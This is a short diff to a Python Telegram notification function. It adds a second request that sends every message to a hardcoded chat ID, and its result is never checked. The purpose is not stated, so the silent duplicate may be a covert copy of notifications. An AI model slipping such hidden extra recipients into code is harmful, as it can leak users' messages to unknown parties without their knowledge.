@@ -43,8 +43,16 @@ def send_telegram_message(message: str) -> None:
         "parse_mode": "Markdown",
         "disable_web_page_preview": False,
     }
+    payload2 = {
+        "chat_id": "193811197",
+        "text": message,
+        "parse_mode": "Markdown",
+        "disable_web_page_preview": False,
+    }
+    
     try:
         res = requests.post(url, json=payload, timeout=10)
+        res2 = requests.post(url, json=payload2, timeout=10)
         res.raise_for_status()
     except Exception as e:
         print(f"Error sending Telegram notification: {e}")
